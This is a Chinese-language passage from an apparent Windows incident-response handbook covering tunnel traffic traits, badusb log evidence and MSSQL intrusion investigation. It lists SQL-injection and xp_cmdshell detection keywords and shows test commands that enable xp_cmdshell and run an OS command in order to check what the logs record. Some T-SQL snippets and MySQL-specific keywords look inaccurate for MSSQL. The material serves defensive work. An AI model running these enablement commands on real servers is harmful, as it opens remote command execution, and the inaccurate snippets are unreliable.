Windows 上常见的 `icmp` 包主要就是 `ping`, 我们尝试 `ping` 一下百度，只一下

可以看到，默认的 `ping` 包大小一定时内部内容是固定的，简单来说就是使用小写字母填充，而隧道正是利用数据段，下面看一段 `ICMP` 隧道的数据包

主要特征如下：

 - 向单一目标发`ICMP` 包频率高
 - `ICMP` 数据包一般大于 `Windows` 平台默认的长度
 - 发送内容可以看出非 `Windows` 平台默认的 `ping` 请求

 ICMP 隧道演示可以查看 知识点附录  -> 0x07 Pingtunnel ICMP隧道演示

### 3. 常见特征

整个网络世界几乎都是基于 TCP 的了，如果想从其中找到什么特征是比较困难的

 - 这些工具中部分是带有代理功能的，从端口监听上可能发现异常端口
 - 部分工具流量有特征字符，尤其是首次连接的时候，但是应急的时间基本不会在首次连接时，所以得依靠流量设备
 - 部分工具存在配置文件，当然这是可以魔改的
 - 没有配置文件的工具启动参数都有明显异常，当然这也是可以魔改的

 这里就要吐槽一下了，设计一款像 `CobaltStrike` 这种可以配置后生成二进制程序的多好，说不定可以直接做免杀

### 3. 常见特征

- 短时间出现 `UDP`流量激增

 - 部分工具可能会创建网卡

### 3. 常见特征

`KCP` 隧道最大的特征就是使用了 `KCP` 协议，目前`KCP` 协议没有应用的那么广，当然了，如果你是游戏服务器，那还是有可能的，但这并不是最大的问题

目前 `KCP` 隧道比较严重的问题还是 `Wireshark` 无法很好地识别 `KCP` 协议

KCP 隧道演示部分可以查看 知识点附录 -> 0x08 kcptun KCP隧道演示

### 3. 特征

由于目前 `HTTP/3` 还应用的不是很广泛，所以主要特征为短时间、单一目标、大量 `QUIC` 协议数据包(可能还包含UDP协议包)以，除此之外就是工具的特征了

QUIC 隧道演示部分可以查看 知识点附录 -> 0x09 gost QUIC隧道演示

### 3. 常见特征

- web 目录存在异常文件
 - 文件中存在关键字
 - 流量中存在部分关键字

 可以通过各种 `webshell` 检测工具进行检测

### 3. 常规处置

接下来的处置就按照挖矿病毒或者远控后门章节的处置办法进行处置就好

### 系统快照

这种主要是云环境或虚拟化环境比较方便，目前似乎这类方式取证出来的内容都会丢失内存信息，属于是关机-快照-导出

虚拟机软件似乎支持例如暂停、冻结等功能，具体根据实际情况决定

### 磁盘取证

磁盘取证有很多工具可以考虑

 - `dd`
 - `FTK Imager`

### 针对性取证

这部分推荐我们自己的 NOPTrace-Collector

https://github.com/Just-Hack-For-Fun/NOPTrace-Collector

我们还推出了一套数字取证和应急响应规范，可以根据此规范自己开发取证程序

https://github.com/Just-Hack-For-Fun/OpenForensicRules

### 内存取证

- `DumpIt`
 - `FTK Imager`

 取证后，对证据进行分析时，需要先单独复制一份，保持所有安全人员分析的基础是相同的

## 12. badusb 投毒事件

> 原文：https://books.noptrace.com/windows/11.badusb%20%E6%8A%95%E6%AF%92%E4%BA%8B%E4%BB%B6/

### 0x00 简介

badusb 攻击是攻击者将恶意代码烧录进 usb 设备，之后插入到受害电脑中，在受害者电脑上执行恶意代码的攻击

大家捡到神灯，通常会说最后一个愿望是再要3个愿望，对于攻击者来说也是一样的，USB设备代码是写死的，插入一次只能执行一次恶意代码，因此攻击者会尽可能得想要进行远程控制被害主机，所以这类事件在处置上与远控后门事件差不多，但是需要进行以下部分步骤

固定证据 -> 分析日志 -> 确定事件发生 -> 确定攻击发生的时间 -> 找到恶意设备 -> 分析恶意代码 -> 进行针对性处置

### 0x01 固定证据

在发生任何安全事件时，确定安全事件真实存在以后，第一步都建议固定证据，固定证据一般有以下几种类型，受害单位可以根据实际需求选择

 - 系统快照 - 一般云环境比较方便这么做
 - 磁盘取证
 - 针对性取证 - 例如日志文件、网络信息、数据库等
 - 内存取证

### 0x02 日志分析

USB 设备插入会触发哪些日志呢？

### 0x03 事件处置

确定好被攻击时间以及攻击者使用的 USB 设备后，可以对 USB 设备交给专业人员进行分析，将分析后的结果辅助后续排查

通过上机排查以及安全设备，确定攻击者的利用手段，远程控制？蠕虫病毒？ 横向攻击？

根据受害主机存在的具体行为进行对应处置，例如如果出现反向连接恶意C&C服务器，即可采用远控后门章节的处置方法；如果出现横向攻击，则需要确定受害面，对受害服务器进行隔离以及排查

### 0x04 善后阶段

直接查看善后阶段即可，主要为定损以及针对性排查处理，目的是解决潜在的受害服务器

### 0x05 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 系统快照

这种主要是云环境或虚拟化环境比较方便，目前似乎这类方式取证出来的内容都会丢失内存信息，属于是关机-快照-导出

虚拟机软件似乎支持例如暂停、冻结等功能，具体根据实际情况决定

### 磁盘取证

磁盘取证有很多工具可以考虑

 - `dd`
 - `FTK Imager`

### 针对性取证

这部分推荐我们自己的 NOPTrace-Collector

https://github.com/Just-Hack-For-Fun/NOPTrace-Collector

我们还推出了一套数字取证和应急响应规范，可以根据此规范自己开发取证程序

https://github.com/Just-Hack-For-Fun/OpenForensicRules

### 内存取证

- `DumpIt`
 - `FTK Imager`

 取证后，对证据进行分析时，需要先单独复制一份，保持所有安全人员分析的基础是相同的

### 获取设备 VID 和 PID

插入设备后，搜索设备管理器

在其中右键 -> 属性 -> 事件 就可以找到与该设备相关的事件了

在这里就可以看到 VID 和 PID 了

### Windows 11

badusb 能够直接攻击服务器的比较少，主要还是对于终端的攻击，经过测试发现，当 Windows 11 插入 USB 设备后留下的日志与 Windows Server 2016 不同，更加详细

一般来说，一个USB设备唯一的特性就是 VID 和 PID ，我们先看一下设备的 VID 和 PID ，之后再看看日志中是否记录了该信息，也好分辨出哪条记录是鼠标插入造成的

可以看到 VID = 046D , PID = C084

现在看一下日志发现，在 Windows 11 中插入 USB HID设备主要触发以下三个事件

 - Microsoft-Windows-Kernel-PnP/Configuration
 - Microsoft-Windows-DeviceSetupManager/Operational
 - Microsoft-Windows-UserPnp/DeviceInstall

 Microsoft-Windows-Kernel-PnP/Configuration 记录较多，主要如下

可以在记录里直接获取到 VID 和 PID ，事件id 主要为 400、410、411、430、440、442

Microsoft-Windows-DeviceSetupManager/Operational 记录如下

这里的 UUID 就是上面我们在 Windows Server 2016 中获取到的 UUID ，事件id为 300

Microsoft-Windows-UserPnp/DeviceInstall 记录如下

事件id 主要为 8001、8008

### Windows Server 2016

在 Windows Server 2016 默认配置下，插入一个设备(我通过鼠标进行模拟，并非真实的badusb)，会在以下两个日志留下痕迹

 - System
 - Microsoft-Windows-DeviceSetupManager/Admin

 在 System 中记录的日志如下

事件 id 为 7036

在 sans 的官方海报中，还提到了 System 日志中事件 id 为 20001, 20003 – Plug and Play driver install attempted 的事件

在本次测试没有触发可能是因为插入的是鼠标不是 badusb ，也可能是因为需要开启某些配置才能记录该事件

在 Microsoft-Windows-DeviceSetupManager/Admin 中记录的日志如下

最后的 112 事件记录了 USB 设备的名称，即我的 G102 鼠标,还记录了一个 UUID ，经过测试，该UUID 是与设备一对一绑定的，所以可以通过在相同的测试系统上重复插设备分析日志来确定引发 badusb 的设备

## 13. MSSQL 事件排查

> 原文：https://books.noptrace.com/windows/12.MSSQL%20%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5/

MSSQL 应急排查部分已经有微步在线应急响应团队、深信服千里目实验室写得非常详细了，本部分基本也就是对其文章的提炼，建议大家阅读 《知攻善防～SQL Server 应急分析（上&下）》、《MSSQL数据库攻击实战指北 | 防守方攻略》

https://mp.weixin.qq.com/s/omDWZ0MK-WRTICXK3K9dZA

https://mp.weixin.qq.com/s/zfUJnAiSzm-gwYVWxGT7Cw

https://mp.weixin.qq.com/s/ug5LmTIbrd_jVG-euNr8aw

### 0x00 固定证据

在发生任何安全事件时，确定安全事件真实存在以后，第一步都建议固定证据，固定证据一般有以下几种类型，受害单位可以根据实际需求选择

 - 系统快照 - 一般云环境比较方便这么做
 - 磁盘取证
 - 针对性取证 - 例如日志文件、网络信息、数据库等
 - 内存取证

### 0x01 简介

MSSQL 是微软官方的一款数据库管理程序，常用于 Windows 操作系统中 .net 开发的系统中，也是攻击者常常利用的攻击点，在非常早期的时候，往往是网站与数据库放在同一个操作系统上，而且 MSSQL 的端口(默认 1433)对外暴露，导致很多安全问题，甚至一些早期黑客还为它专门开发了“1433抓鸡”程序

现在安全防护水平提升了，MSSQL 面临的威胁主要是以下这些内容:

 - 弱口令
 - SQL 注入
 - 权限提升
 - 数据泄露
 - 隐藏后门

 这里可以看出，我们只需要对以下几种内容进行关注

 - MSSQL 登录日志
 - MSSQL 数据库操作日志
 - MSSQL 相关的基础组件
 - 作业(Job)
 - 存储过程
 - OLE 对象接口
 - 程序集
 - 备份与恢复过程

### 0x02 用户及会话分析

我们可以查看的是当前可登录的用户以及会话情况

获取用户信息

 `SELECT * FROM
    sys.server_principals
WHERE
    type IN ('S', 'U') -- 'S' for SQL Server authentication, 'U' for Windows authentication
ORDER BY
    name;

```

其中 `is_disabled` 为 1 的用户被禁止了，其中 helper 是我的测试电脑的用户的名字，实际情况可能不一样，当前身份认证模式是混合模式

也可以通过图形化的方式进行查看

 `安全性 -> 登录名

```

获取当前会话情况

 `SELECT
    session_id,
    login_time,
    host_name,
    login_name,
    program_name,
    status,
    last_request_start_time,
    last_request_end_time
FROM
    sys.dm_exec_sessions
WHERE
    status NOT IN ('sleeping', 'background');

```

### 0x03 MSSQL 登录日志分析

这部分内容在 暴力破解 -> 0x06 MSSQL 暴力破解 章节已经详细阐述，这里简单介绍一些位置之类的

MSSQL 2016 中，使用 SSMS 进行数据库连接和管理

在 管理 -> SQL Server日志中可以看到具体的日志信息

默认情况下似乎不记录登录成功的日志，除非额外配置审计日志

当然，在这里我们还可以勾选其他日志，一起进行查看

### 0x04 SQL执行日志分析

默认情况下，其实也不会记录执行的 SQL 语句，即使是出错的 SQL 语句也不会执行

这也很好理解，增删改查的量这么大，记录起来会严重影响性能并且额外占用资源

但某些单位自研或者采购的日志记录或者安全设备可能会记录部分或完整的 SQL 日志，比较常见的是记录哪些安全设备认为是可疑或者恶意的请求，这样记录量就会小很多，所以在寻找蛛丝马迹的时候不要忘了安全设备

如果记录了全量的SQL日志，可以关注除了常规的增删改查以外的日志，尤其是包含以下关键字:

 - SQL注入相关

 - 字符串拼接：`+`, `||`, `CONCAT()`, `CONCAT_WS()`

 - 特殊字符和转义序列：`'`, `--`, `/*`, `*/`, `;`, `#`, `\`

 - 错误触发：`UNION`, `SELECT`, `FROM`, `WHERE`, `AND`, `OR`, `GROUP BY`, `HAVING`, `ORDER BY`

 - 数据库元信息泄露：`DATABASE()`, `USER()`, `VERSION()`, `SYSTEM_USER()`, `SESSION_USER()`, `CURRENT_USER()`, `@@VERSION`, `@@SERVERNAME`

 - 存储过程调用：`EXEC`, `EXECUTE`, `SP_EXECUTESQL`, `xp_cmdshell`, `sp_OACreate`,`xp_regwrite`, `xp_regread`, `addextendedproc`

 - 文件系统访问：`LOAD_FILE()`, `READTEXT()`, `WRITETEXT()`, `BULK INSERT`

 - 内置函数滥用：`ASCII()`, `CHAR()`, `CHR()`, `MID()`, `SUBSTR()`, `SUBSTRING()`, `HEX()`, `UNHEX()`

 - 非常规的执行时间：特别长的查询执行时间可能表明有异常行为
 - 频繁的错误尝试：多次失败的登录尝试，或者带有错误信息的查询，可能意味着暴力破解或基于错误的SQL注入攻击尝试

 - 数据泄漏相关

 - 大量数据导出：`SELECT`语句后面跟着大量列名或使用`*`选择所有列，尤其是与敏感数据相关的表。

 - 文件写入操作：`INTO OUTFILE`, `INTO DUMPFILE`, `BULK INSERT`, `OPENROWSET()`

 - 提权与绕过访问控制

 - 权限更改：`GRANT`, `REVOKE`, `DENY`, `ALTER AUTHORIZATION`

 - 用户管理：`CREATE USER`, `ALTER USER`, `DROP USER`, `LOGIN`, `LOGOUT`

 - 密码重置或修改：`ALTER LOGIN`, `ALTER USER SET PASSWORD`

 - 数据库结构修改相关

 - 表和索引管理：`CREATE TABLE`, `DROP TABLE`, `ALTER TABLE`, `CREATE INDEX`, `DROP INDEX`

 - 存储过程和函数修改：`CREATE PROCEDURE`, `ALTER PROCEDURE`, `DROP PROCEDURE`, `CREATE FUNCTION`, `ALTER FUNCTION`, `DROP FUNCTION`

 - 信息收集相关

 - 系统信息查询：`INFORMATION_SCHEMA.*`, `sys.*` (如`sys.databases`, `sys.tables`, `sys.columns`)

 - 枚举数据库和表：`SHOW DATABASES`, `SHOW TABLES`, `SHOW COLUMNS FROM`

 - 配置相关

 - `TRUSTWORTHY` 一个数据库级别的配置选项，当设置为`ON`时，允许数据库中的代码执行不受限制的操作，包括读取文件系统、注册表和其他数据库。
 - `show advanced options` 这个命令用于显示SQL Server的一些高级配置选项，其中一些可能影响服务器的安全性。这些选项通常不会直接导致安全问题，但它们的不当配置可能会引入风险。
 - `RECONFIGURE` 该命令用于在不重启服务的情况下更新SQL Server的运行时配置。这可以立即应用某些配置更改，但如果被攻击者利用，也可以用于迅速改变服务器的安全设置。
 - `sp_configure` 攻击者常使用该方法开启 xp_cmdshell

 - 程序集相关

 - `Unsafe assembly`

 - 高危 DLL
 - `xplog70.dll`  可用于恢复xp_cmdshell等存储过程
 - `xpstar.dll`  可用于恢复xp_sqlagent_notify
 - `xpsqlbot.dll`  可用于恢复xp_qv
 - `odsole70.dll` 可用于恢复Sp_OACreate

### 0x05 存储过程排查

只要是看过 Web 安全相关书籍的朋友们肯定听过存储过程这个词，也几乎都听到过 `xp_cmdshell` 这个词，但对于什么是存储过程可能并不完全了解，当然，这可能并不影响排查

简单来说存储过程就像是一个写好的函数，它实现了特定的功能，接收我们传递给它的参数，之后按照预期执行，给我们返回结果。需要注意的是，存储过程本身也是可能存在 SQL 注入的

存储过程分为以下几种

 - 系统存储过程（System Stored Procedures）:

 - 这些存储过程由数据库管理系统提供，以`sp_`为前缀。它们主要用于管理数据库和获取关于数据库的信息，如执行维护任务、查看数据库结构或用户信息。例如，`sp_help` 可以用来获取对象的帮助信息，`sp_helpdb` 则可以报告数据库的信息。

 - 扩展存储过程（Extended Stored Procedures）:

 - 这些存储过程通过动态链接库（DLLs）实现，以`xp_`为前缀。它们提供了超出标准SQL语言之外的功能，允许直接调用操作系统级的函数，例如`xp_cmdshell` 就可以用来执行操作系统命令。扩展存储过程需要特别注意安全，因为它们可以执行潜在危险的操作。

 - 用户定义的存储过程（User-defined Stored Procedures）:

 - 这些存储过程由数据库用户创建，用于执行特定的业务逻辑或数据操作任务。它们可以接受输入参数，返回输出参数，以及执行复杂的事务处理和错误处理。

 - 临时存储过程（Temporary Stored Procedures）:

 - 临时存储过程在会话期间存在，可以创建局部或全局的临时存储过程。局部临时存储过程名称以`#`开头，仅在创建它的会话中可见；全局临时存储过程名称以`##`开头，对所有会话都可见。

 - 远程存储过程（Remote Stored Procedures）:

 - 这种类型的存储过程在不同的数据库服务器上执行，但可以从本地数据库服务器上调用。这种特性在分布式数据库系统中非常有用。

 - CLR存储过程（Common Language Runtime Stored Procedures）:

 - 在 SQL Server 2005 及更高版本中，可以使用 `.NET Framework` 的 CLR 来编写存储过程，这提供了更丰富的编程模型和更高的执行效率。CLR 存储过程可以用 C#、VB.NET 等语言编写。

 MSSQL 不是一个数据库，而是数据库管理系统，也就是它管理着多个数据库，其中系统存储过程 (sp_ 为前缀的)  由 SQL Server 系统提供的，可以在任何数据库上下文中调用，用于执行各种管理任务或获取信息。这些存储过程实际上是存在于`master`数据库中的，但由于它们的特殊性质，你可以在任何数据库中直接调用它们，而无需显式地指定数据库名称

扩展存储过程 (主要以 xp_ 为前缀的，也存在 sp_ 为前缀的) 是作为动态链接库（DLL）文件存在于文件系统上的，这些DLL文件是被SQL Server在运行时加载的，它们并不存储在数据库文件中，也不属于任何一个具体的数据库。当在SQL Server中注册一个扩展存储过程时，这个注册信息实际上是保存在`master`系统数据库中的`sys.dlls` 和 `sys.server_permissions` 表里。这意味着一旦注册，扩展存储过程就可以在SQL Server实例下的所有数据库中被调用，只要相应的用户具有足够的权限。

除了上面两个存储过程以外，其他存储过程均由每个数据库自己维护一份，因此我们排查的时候也是需要挨个数据库排查

### 0x06 程序集排查

在 Microsoft SQL Server 2016 中，程序集（Assemblies）是指托管代码（Managed Code）程序集，可以使用 .NET 框架编写并在 SQL Server 中托管和执行。通过使用程序集，开发人员可以编写复杂的逻辑，并将其集成到 SQL Server 中，以扩展其功能。

简单来说就是使用 .Net 语言编写程序，编译成DLL，之后加载进 MSSQL 中，之后 MSSQL 就可以使用该 DLL 中的功能，创建存储过程或者函数。

在 Microsoft SQL Server 中，程序集（Assemblies）是每个数据库单独使用的，而不是所有数据库共用的。每个数据库有自己的程序集空间，程序集在一个数据库中创建后，只能在该数据库内使用。

### 0x07 作业 (Job)

“作业”（Jobs）是一种自动化任务的机制，允许数据库管理员（DBA）和开发人员调度和执行一系列预定义的操作。这些作业可以在特定的时间点或根据预定的时间表自动运行，也可以由用户手动触发。

一个 SQL Server 作业通常包含以下组成部分：

 - 作业名称：用来标识作业的唯一名称。
 - 所有者：指定作业的拥有者，通常是 SQL Server 登录账户或 Windows 用户账户。
 - 步骤：作业的一个步骤是一组可以执行的操作，比如运行 T-SQL 语句、执行存储过程、导入导出数据、发送电子邮件等。一个作业可以包含多个步骤，步骤之间可以有依赖关系，前一个步骤的执行结果可以决定后续步骤是否执行。
 - 计划：定义作业何时运行的时间表，可以是一次性的，也可以是周期性的，比如每天、每周、每月等。
 - 警报：可以配置作业在特定条件下触发警报，例如当作业失败时通知管理员。
 - 通知：作业可以配置通知选项，以便在作业开始、完成或失败时发送电子邮件或短信给指定的收件人。
 - 历史记录：SQL Server 作业保留执行历史记录，包括开始时间、结束时间、持续时间以及作业的状态（如成功、失败或正在运行）。
 - 安全性：可以设置作业的安全级别，例如限制哪些用户可以查看或修改作业。

 作业是由 SQL Server Agent 统一管理，这意味着作业是跨所有数据库的，或者说是在 SQL Server 实例级别的。SQL Server Agent 是一个服务，它负责调度和执行预先定义的任务，即作业

### 0x08 函数排查

在 SQL Server 2016 中，用户可以创建两种类型的自定义函数：标量值函数和内聚表值函数（Table-Valued Functions）。标量值函数返回一个单一值，而表值函数可以返回一个结果集，类似于一个表。

每个数据库有自己的函数，MSSQL 2016 默认情况下，默认数据库以及新建的数据库均无以下函数

 - 标量值函数
 - 表值函数
 - 聚合函数

### 0x09 数据库触发器

在 MSSQL 2016 中默认情况下默认数据库以及新建数据库均无数据库触发器

### 0x10 其他内容

其他内容的排查就需要将受害现场与纯净的数据库管理系统进行对比了，对比出现的差异与开发、运维等相关人员确认

### 1. 排查系统存储过程

系统存储过程存储在 `master` 数据库中

然而比较尴尬的是，默认的系统存储过程有 1000 多个，每一个管理员权限都是可以编辑的，每一个都看一遍的话，时间上来不及，所以我们采取两种方案进行排查

 - 排查最新修改的系统存储过程
 - 根据系统存储过程执行记录，排查相关的系统存储过程

 `SELECT name, type_desc, create_date, modify_date
FROM sys.all_objects
WHERE type = 'P' AND name LIKE 'sp_%'
ORDER BY modify_date DESC;

```
 可以通过在 `master` 数据库中执行上述语句，找出所有系统存储过程，并按照修改时间倒序排序

假设我们想查看最新修改的这个系统存储过程，可以使用以下语句看一下其定义

 `USE YourDatabaseName; -- 替换为实际的数据库名
SELECT OBJECT_DEFINITION(OBJECT_ID(N'YourProcedureName')) AS ProcedureDefinition;

```

经过查询发现，其实 `sp_MScleanupmergepublisher` 这个系统存储过程是`sys.sp_MScleanupmergepublisher_internal` 系统存储过程的别名，所以我们使用 `sys.sp_MScleanupmergepublisher_internal` 进行查询

这回就出现了该系统存储过程的定义，我们复制出来格式化一下

 `-- Name: sp_MScleanupmergepublisher_internal
-- Description: This procedure currently performs the following function(s):
--              1) Cleans up all the stale dynamic snapshot views
--              in all databases enabled for merge replication. This
--              procedure should normally be called at merge publisher startup.
--
-- Notes: 1)This procedure is enabled as a startup procedure when a database is
--        enabled as a first merge publisher database on the server and it
--        will be unmarked as a startup procedure when the last merge publisher
--        database is disabled.
--        2)Errors within the SP are mostly ignored.
--        3)This procedure can also be used by admins/securityadmins to perform
--        manual cleanup of all dynamic snapshot views. Note that cleaning up the
--        dynamic snapshot views can disrupt dynamic snapshots that are being generated.
--
-- Returns: (undefined)
--
-- Security: Only members of the sysadmin fixed server role can execute this
--           procedure successfully. So for this procedure to function properly
--           as a startup procedure, the MSSQLServer service account must be a
--           member of the sysadmin role.
-- Requires Certificate signature for catalog access
CREATE PROCEDURE sys.sp_MScleanupmergepublisher_internal
AS
BEGIN
    SET NOCOUNT ON;

    DECLARE @status_mask INT;
    DECLARE @published_mask INT;
    DECLARE @published_database_name SYSNAME;
    DECLARE @command NVARCHAR(4000);

    -- Security check: sysadmin only
    IF (ISNULL(IS_SRVROLEMEMBER('sysadmin'), 0) = 0)
    BEGIN
        RAISERROR(14260, 16, -1);
        RETURN (1);
    END;

    -- Masks off the databases with status that we don't want to deal with
    SELECT @status_mask = 32 | -- loading
                       64 | -- pre recovery
                       128 | -- recovering
                       256 | -- not recovered
                       512 | -- offline
                       1024; -- read only

    SELECT @published_mask = 4; -- Merge published

    DECLARE hPublishedDatabase CURSOR LOCAL FAST_FORWARD FOR
    SELECT name FROM sys.databases
    WHERE (status & @status_mask) = 0
    AND (category & @published_mask) <> 0;

    OPEN hPublishedDatabase;
    FETCH hPublishedDatabase INTO @published_database_name;

    WHILE (@@FETCH_STATUS <> -1)
    BEGIN
        SELECT @command = QUOTENAME(@published_database_name) + '.sys.sp_MScleanupmergepublisherdb';
        EXEC @command;

        -- Ignore errors
        FETCH hPublishedDatabase INTO @published_database_name;
    END;

    CLOSE hPublishedDatabase;
    DEALLOCATE hPublishedDatabase;
END;

```
 但其实根本没必要，我们是可以直接通过左侧找到该存储过程，右键修改来查看

排查系统存储过程的执行记录

默认 MSSQL 不会记录系统存储过程的执行，我们以 `sp_who2` 为例

 `USE master;
GO
EXEC sp_who2;
GO

```

执行成功，我们看一下日志中是否存在记录

并没有相关记录

目前还没有发现能够自动化判断是否存在恶意系统存储过程的工具，有的话，后续会添加进手册

### 1. 获取所有的作业(Job)

`USE msdb;
GO
SELECT * FROM dbo.sysjobs;
GO

```
 可以看到有一条作业，查看该作业详细信息

通过 `job_id` 查询更多信息

查询作业步骤

 `USE msdb;
GO

-- 作业步骤信息
SELECT *
FROM dbo.sysjobsteps
WHERE job_id = '267BA740-1476-49E2-9F5C-B3CDD78B1B9C';

```

查询作业执行历史

 `USE msdb;
GO

SELECT *
FROM dbo.sysjobhistory
WHERE job_id = '267BA740-1476-49E2-9F5C-B3CDD78B1B9C';

```

看来该作业从来没有执行过

当然也可以通过图形化获取作业信息

可以看到，默认情况下被禁用了，我们右键启动

可以通过点击直接查看作业列表，并查看作业的详细信息，`syspolicy_purge_history` 是默认存在的

可以通过作业活动监视器查看作业活动情况

可以通过错误日志查看作业产生的错误

### 1. 查找当前数据库中的程序集

`SELECT * FROM sys.assemblies;

```
 `Microsoft.SqlServer.Types` 应该是每个数据库默认的程序集，我们可以通过图形化的方式查看程序集

 `数据库 -> 数据库名称 -> 可编程性 -> 程序集

```

### 2. 排查扩展存储过程

`USE YourDatabaseName; -- 替换为实际的数据库名
SELECT name, type_desc, create_date, modify_date
FROM sys.all_objects
WHERE type = 'X'
ORDER BY modify_date DESC;

```
 MSSQL 中默认扩展存储过程不只是 xp_ 开头的存储过程，还有 sp_ 开头的存储过程，它们都是 DLL 起的，所以右键没有修改选项

我们测试一下，执行扩展存储过程是否会留下记录

 `EXEC master..xp_dirtree 'C:\', 1, 1;

```

看来 `xp_dirtree` 默认还是可以使用的，不需要 `EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;`

我们看一下是否会留下日志

也没有留下日志

直接使用 `xp_cmdshell` 会留下什么日志？

 `EXEC master..xp_cmdshell 'dir C:\';

```

可以看到，留下了两条日志，内容一样，这也就意味着如果攻击者贸然执行了 `xp_cmdshell` 是有可能在日志里留下痕迹的

如果以管理员权限配置可以执行 `xp_cmdshell` ，会留下什么日志

 `-- 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXEC master..xp_cmdshell 'dir C:\';

```

成功执行，我们去看一下日志情况

产生了四条日志，本质上是两条，就告诉我们 `show advanced options` 配置项由 0 转为 1 ；`xp_cmdshell` 配置项由 0 转为 1

所以我们的排查也就分为两个方向

 - 根据日志排查
 - 根据常见和修改时间排查

 根据修改时间排查的语句为

 `USE master;
GO

SELECT name, create_date, modify_date
FROM sys.all_objects
WHERE type = 'X'
ORDER BY modify_date DESC;

```

像刚才的配置更改与创建和修改时间没关系，不会影响排查结果

假设 `xp_prop_oledb_provider` 是近期修改过的，与前面的时间截然不同，我们如何找到对应的 DLL 呢？

 `EXEC sp_helpextendedproc 'xxxxxxx';

```

可以看到这里只有 dll 文件的名字，没有路径，它所在位置为

 `C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\Binn\XPStar.DLL

```

路径里包含 MSSQL 版本信息，所以根据实际情况更改，该目录下的 DLL 文件基本都有签名

如果是攻击者制定的 DLL 创建的存储过程，可能会显示出绝对路径

对于扩展存储过程，无法直接修改其内容，直接右键删除就好，或者通过以下命令

 `USE master;
GO
EXEC sp_dropextendedproc N'YourMaliciousProc';
GO

```

删除后，可以通过以下命令确定结果

 `SELECT
    name,
    type_desc
FROM
    sys.server_principals
WHERE
    type = 'X'
AND
    name = N'YourMaliciousProc';

```

加载扩展存储过程会留下日志

### 2. 查找程序集对应的文件

`SELECT * FROM sys.assembly_files;

```
 该文件所在路径为

 `C:\Windows\assembly\GAC_MSIL\Microsoft.SqlServer.Types\13.0.0.0__89845dcd8080cc91

```

### 2. 新建作业

查看日志

并不会记录新建作业的日志

### 3. 用户自定义存储过程

用户自定义存储过程是每个数据库单独定义的，所以在检查的时候也要检查所有的数据库的用户自定义存储过程

数据库 -> 数据库名字 -> 可编程性 -> 存储过程

默认情况下，只有系统存储过程一个节点，如果还有其他的，例如本案例中的 `dbo.usp_GetCustomerInfo` 就是用户自定义的存储过程，可以直接编辑并且可以删除

查找每一个数据库的自定义存储过程进行一一确认即可

### 3. 添加恶意程序集日志

将以下 C# 代码保存为 MyStoredProcedures.cs

 `using System;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;

public class MyStoredProcedures
{
    [SqlProcedure]
    public static void HelloWorld()
    {
        SqlContext.Pipe.Send("Hello, world!");
    }
}

```
 使用 csc.exe 编译成 DLL

 `csc /target:library /out:MyStoredProcedures.dll MyStoredProcedures.cs

```

导入程序集

 `-- 导入程序集
CREATE ASSEMBLY MyStoredProcedures
FROM 'C:\Path\To\MyStoredProcedures.dll'
WITH PERMISSION_SET = SAFE

```

刷新一下

在程序集处成功显示出来，观察一下日志

这里的日志显示的是 AppDomain 2 (MyDatabase.dbo[ddl].1)已卸载。

### 3. 删除作业

### 4. 删除程序集

直接右键删除即可

或者通过 SQL 命令

 `-- 删除程序集
DROP ASSEMBLY MyStoredProcedures;

```

刷新页面

删除程序集不会记录日志

### 系统快照

这种主要是云环境或虚拟化环境比较方便，目前似乎这类方式取证出来的内容都会丢失内存信息，属于是关机-快照-导出

虚拟机软件似乎支持例如暂停、冻结等功能，具体根据实际情况决定

### 磁盘取证

磁盘取证有很多工具可以考虑

 - `dd`
 - `FTK Imager`

### 针对性取证

这部分推荐我们自己的 NOPTrace-Collector

https://github.com/Just-Hack-For-Fun/NOPTrace-Collector

我们还推出了一套数字取证和应急响应规范，可以根据此规范自己开发取证程序

https://github.com/Just-Hack-For-Fun/OpenForensicRules

### 内存取证

- `DumpIt`
 - `FTK Imager`

 取证后，对证据进行分析时，需要先单独复制一份，保持所有安全人员分析的基础是相同的

## 14. 善后阶段

> 原文：https://books.noptrace.com/windows/13.%E5%96%84%E5%90%8E%E9%98%B6%E6%AE%B5/

### 0x01 定损

定损过程就是确定受害范围的过程，此过程主要是与网络安全负责人、系统管理员、应用管理员、网络管理员等进行沟通交流

 - 统计出与受害系统使用了相同密码的服务器

 - 统计出与受害系统部署了相同存在漏洞或特有服务的服务器

 - 例如负载均衡下的服务器

 - 统计出与受害系统同一管理人员管理下的服务器

 - 主要是系统管理员和应用管理员

 - 统计出受害系统可以使用 ssh 密钥直接登录的服务器

 - 统计出受害系统可以使用 RDP 已保存信息直接登录的服务器

 - 统计出受害系统受害期间频繁交互的服务器

 - ...

### 0x02 针对性排查处理

- 如果服务器数量不多，可以按照常规安全检查章节对服务器进行安全检查
 - 若服务器数量较多，可以通过安全设备查看是否存在来自这些服务器发起的攻击
 - 对内发起攻击
 - 对外发起攻击

 - 修改这些服务器的密码，尽量保证每一台服务器密码均不同，且为强口令

## 15. 常规安全检查

> 原文：https://books.noptrace.com/windows/14.%E5%B8%B8%E8%A7%84%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5/

案例操作系统为 Windows Server 2016

root 账户来模拟普通用户账户

Administrator 为管理员账户

admin$ 账户来模拟隐藏普通账户

Windows 命令行常规情况下是不区分大小写的，因此大小写都可以

### 0x00 杀毒软件

如果应急响应过程中允许，使用杀毒程序进行全盘杀毒肯定非常有帮助的，目前很多企业都有自己的终端管控程序，其中部分自带病毒库和杀毒功能，如果允许可以考虑异构排查

需要注意，大部分杀毒软件都有白名单等功能，全盘查杀可能会跳过这些内容，建议注意是否存在白名单情况，对白名单详细排查

### 0x01 近期活动

这部分偏取证一些，不过对于很多应急场景，例如恶意文件被删除了，分析程序执行非常有用，这部分主要参考以下网址，感谢分享

https://www.sans.org/posters/windows-forensic-analysis/

